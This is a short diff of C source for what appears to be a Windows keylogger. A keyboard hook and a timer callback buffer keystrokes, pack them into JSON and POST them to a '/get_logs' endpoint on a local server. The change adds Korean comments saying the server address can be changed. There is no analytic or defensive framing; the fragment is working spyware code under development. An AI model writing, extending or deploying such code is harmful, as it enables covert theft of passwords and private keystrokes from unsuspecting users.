@@ -154,7 +154,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);
 
                 // 서버로 데이터 전송
-                send_post_request("127.0.0.1", 3000, "/get_logs", json_data);
+                send_post_request("127.0.0.1", 3000, "/get_logs", json_data); // 서버 주소 변경 가능
 
                 // 버퍼 초기화
                 logBufferIndex = 0;
@@ -232,7 +232,7 @@ void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
         logBuffer[logBufferIndex] = '\0';
         char json_data[BUFSIZE];
         snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);
-        send_post_request("127.0.0.1", 3000, "/get_logs", json_data);
+        send_post_request("127.0.0.1", 3000, "/get_logs", json_data); // 서버 주소 변경 가능
 
         // 버퍼 초기화
         logBufferIndex = 0;
